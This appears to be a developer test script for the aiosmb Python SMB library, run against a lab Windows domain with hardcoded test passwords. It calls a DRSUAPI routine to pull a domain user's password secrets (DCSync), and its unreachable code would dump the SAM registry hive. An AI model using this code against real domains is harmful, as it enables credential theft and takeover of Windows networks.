import asyncio

import enum
import os

from aiosmb.commons.smbcredential import SMBCredential
from aiosmb.commons.smbtarget import SMBTarget
from aiosmb.smbconnection import SMBConnection
from aiosmb.filereader import SMBFileReader
from aiosmb.commons.authenticator_builder import AuthenticatorBuilder
from aiosmb.dcerpc.v5.transport.smbtransport import SMBTransport
from aiosmb.dcerpc.v5.interfaces.drsuapimgr import SMBDRSUAPI
from aiosmb.dcerpc.v5.interfaces.remoteregistry import SMBRemoteRegistryService
from aiosmb.dcerpc.v5 import srvs, wkst, rrp, scmr
		
	

		

async def filereader_test(connection_string, filename):
	target = SMBTarget.from_connection_string(connection_string)
	credential = SMBCredential.from_connection_string(connection_string)
	
	spneg = AuthenticatorBuilder.to_spnego_cred(credential, target)
	
	async with SMBConnection(spneg, target) as connection: 
		await connection.login()
		
		try:
			t = SMBDRSUAPI(connection, 'TEST.corp')
			await t.connect()
			await t.open()
			input('open succsess!')
			await t.get_user_secrets('victim')
		except Exception as e:
			import traceback
			traceback.print_exc()
			print('Error! %s' % e)
		return
		tmpFileName = os.urandom(4).hex() + '.tmp'
		rreg = SMBRemoteRegistryService(connection)
		await rreg.save_hive('SAM', tmpFileName)
		
		print('Success! Registry file should be in %s' % ('SYSTEM32\\'+tmpFileName))
		await rreg.close()
		return
		rpctransport = SMBTransport(connection, filename=r'\srvsvc')
		dce = rpctransport.get_dce_rpc()
		await dce.connect()
		await dce.bind(srvs.MSRPC_UUID_SRVS)
		resp = await srvs.hNetrShareEnum(dce, 1)
		print(resp['InfoStruct']['ShareInfo']['Level1']['Buffer'])
		
		
		rpctransport = SMBTransport(connection, filename=r'\wkssvc')
		dce = rpctransport.get_dce_rpc()
		await dce.connect()
		await dce.bind(wkst.MSRPC_UUID_WKST)
		resp = await wkst.hNetrWkstaUserEnum(dce, 1)
		print(resp['UserInfo']['WkstaUserInfo']['Level1']['Buffer'])
		
		rpctransport = SMBTransport(connection, filename=r'\wkssvc')
		dce = rpctransport.get_dce_rpc()
		await dce.connect()
		await dce.bind(wkst.MSRPC_UUID_WKST)
		resp = await wkst.hNetrWkstaUserEnum(dce, 1)
		print(resp['UserInfo']['WkstaUserInfo']['Level1']['Buffer'])
	
if __name__ == '__main__':
	#connection_string = 'TEST/victim/ntlm/password:Passw0rd!1@10.10.10.2'	
	#connection_string = 'TEST/Administrator/ntlm/password:QLFbT8zkiFGlJuf0B3Qq@win2019ad.test.corp/10.10.10.2'
	#connection_string = 'TEST/Administrator/sspi-ntlm/password:QLFbT8zkiFGlJuf0B3Qq@win2019ad.test.corp/10.10.10.2'
	connection_string = 'TEST/Administrator/kerberos/password:QLFbT8zkiFGlJuf0B3Qq@win2019ad.test.corp/10.10.10.2'
	#connection_string = 'TEST.corp/Administrator/sspi-kerberos@win2019ad.test.corp/10.10.10.2'
	filename = '\\\\10.10.10.2\\Users\\Administrator\\Desktop\\smb_test\\testfile1.txt'
	
	
	asyncio.run(filereader_test(connection_string, filename))
	
	
	'TODO: TEST NT hash with ntlm!'